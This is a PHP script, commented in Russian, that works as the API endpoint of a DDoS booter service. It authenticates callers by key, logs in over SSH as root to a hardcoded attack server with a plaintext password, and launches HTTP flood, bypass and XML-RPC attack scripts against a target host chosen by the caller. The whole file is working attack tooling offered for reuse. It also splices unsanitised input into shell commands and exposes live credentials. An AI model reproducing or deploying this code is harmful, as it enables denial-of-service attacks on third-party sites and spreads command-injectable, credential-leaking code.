<?php
ignore_user_abort(true);
set_time_limit(86400);
$server_ip = "95.163.243.12"; //IP Дедика со спуфом
$server_pass = "v:vKHV34_s+|"; //пасс дедика
$server_user = "root"; //рут епта
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$array = array(
    "SmartPost",
    "SmartGet",
    "Engine",
    "HTTP-PPS",
    "XML-RPC",
    "UPDATE",
    "stop",
    "stopall"
); //Тут все методы твои, stop не удаляй
$ray = array(
    "XNb2tDwvlUon55KwnR7MkcN3MBrqSrbvhhSfOQ3xZHtwLBeSGQGJFyNR5tP8b7u38dU48eosvsa9PnjbMAqWvhWP7DAb0OtbVDk"
); //Тут апи ключ, который сам впишешь и будешь юзать в гет запросе
if (!empty($time))
{
    if (!empty($host))
    {
        if (!empty($method))
        {
            if ($method == "stop")
            {
                $command = "pkill $host -f";
            } //Эта хуйня чтоб стопать атаку, команду можешь поменять, если хочешь
            
        }
    }
}
if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) 
{
    die('Host is not a valid URL');
}
if (!empty($key))
{
}
else
{
    die('Ошибка: укажите API-ключ!');
}
if (in_array($key, $ray))
{
}
else
{
    die('Ошибка: неверный API-ключ!');
}
if (!empty($time))
{
}
else
{
    die('Ошибка: укажите время атаки!');
}
if (!empty($host))
{
}
else
{
    die('Ошибка: укажите хост!');
}
if (!empty($method))
{
}
else
{
    die('Ошибка: укажите метод!');
}
if (in_array($method, $array))
{
}
else
{
    die('Ошибка: метод, который Вы указали не существует!');
}
if ($port > 65535)
{
    die('Ошибка: порта больее 65535 не существует!');
}
if ($time > 86400)
{
    die('Ошибка: атака не может быть более 86400 секунд!');
}
if (ctype_digit($Time))
{
    die('Ошибка: время указано не в цифрах!');
}
if (ctype_digit($Port))
{
    die('Ошибка: порт указан не в цифрах!');
}
//Тут начинаются уже все методы и команда к ним. Можешь сделать свои и удалить мои
if ($method == "Engine")
{
    $command = "screen -md timeout $time node method.js $host $time request proxy.txt GET false false false";
}
if ($method == "SmartGet")
{
    $command = "screen -md timeout $time node JSBYPASS.js $host GET $time proxy.txt";
}
if ($method == "SmartPost")
{
    $command = "screen -md timeout $time node JSBYPASS.js $host POST $time proxy.txt";
}
if ($method == "HTTP-PPS")
{
    $command = "screen -md timeout $time node HTTP-PPS.js $host proxy.txt";
}
if ($method == "XML-RPC")
{
    $command = "screen -md timeout $time ./xmlrpc $host xml.txt $time 2048";
}
if ($method == "UPDATE")
{
    $command = "screen -md sh proxy.sh";
}
if ($method == "stopall")
{
    $command = "pkill -f http";
}
if (!function_exists("ssh2_connect")) die("Ошибка: SSH2 не установлен на Вашем сервере!");
if (!($con = ssh2_connect($server_ip, 22)))
{
    echo "Ошибка: похоже, дедик ахуел :D";
}
else
{
    if (!ssh2_auth_password($con, $server_user, $server_pass))
    {
        echo "Ошибка: неверный логин или пароль!";
    }
    else
    {

        if (!($stream = ssh2_exec($con, $command)))
        {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        }
        else
        {
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream, 4096))
            {
                $data .= $buf;
            }
            if ($method == "stopall") {
                echo "All attack has been stopped";
                exit;
            } elseif ($method == "stop") {
                echo "Attack has been stopped";
                exit;
            } else {
                echo "Attack has been started";
                exit;
            }
            fclose($stream);
        }
    }
}
?>
